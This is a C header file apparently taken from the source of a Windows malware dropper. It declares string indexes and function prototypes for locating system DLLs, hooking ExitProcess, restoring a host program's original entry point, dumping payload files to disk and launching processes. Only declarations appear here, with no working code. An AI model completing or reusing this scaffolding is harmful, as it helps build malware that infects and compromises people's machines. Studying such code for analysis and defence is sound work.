#ifndef droppercode_h__
#define droppercode_h__

#include "common.h"
#include "DropperHeader.h"


#pragma region STRINGS_INDEXES

#define STRIDX_INSTALL_DIR		0
#define STRIDX_TMP_ENVVAR		1
#define STRIDX_TEMP_ENVVAR		2
#define STRIDX_KERNEL32_DLL     3
#define STRIDX_NTDLL_DLL		4
#define STRIDX_MSVCRT_DLL		5
#define STRIDX_LOADLIBRARYA		6
#define STRIDX_GETPROCADDRESS	7
#define STRIDX_RUNDLL			8
#define STRIDX_COMMAHFF8		9
#define STRIDX_HFF5				10
#define STRIDX_DIRSEP			11
#define STRIDX_USER32_DLL		12
#define STRIDX_RTLEXITUSERPROCESS 13
#define STRIDX_EXITCALL			14
#define STRIDX__EXITCALL		15
#define STRING_EXITPROCESS		16

#if _DEBUG
#define STRIDX_ERRORCREDIR		17
#define STRIDX_EXITPROCIDX		18
#define STRIDX_EXITPROCHOOKED   19
#define STRIDX_RESTOREOEP		20
#define STRIDX_EXITHOOKED		21
#define STRIDX_OEPRESTORED		22
#define STRIDX_CALLINGOEP		23
#define STRIDX_CREATEFILE_ERR   24
#define STRIDX_HFF5CALLING      25
#define STRIDX_HFF5CALLED	    26
#define STRIDX_INEXITPROC_HOOK  27
#define STRIDX_VECTORQUIT		28
#define STRIDX_VERIFYVERSION    29
#define STRIDX_SYSMAJORVER		30
#define STRIDX_SYSMINORVER		31
#define STRIDX_RESTORESTAGE1	32
#define STRIDX_RESTORESTAGE2	33
#define STRIDX_UNCOMPRESS_ERR   34
#endif

#pragma endregion

#define STRING(idx) (char*)(strings + stringsOffsets[(idx)])

int __stdcall DropperEntryPoint( DropperHeader* header );
BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD fileSize, DWORD originalSize, DropperHeader* header);
DWORD WINAPI CoreThreadProc(LPVOID lpParameter);

typedef BOOL (WINAPI * DUMPFILE)(CHAR * fileName, CHAR* fileData, DWORD fileSize, DWORD originalSize, DropperHeader *header);
typedef void (*HFF5)(CHAR*, DWORD, STARTUPINFO*, PROCESS_INFORMATION*);

#endif /* droppercode_h__ */


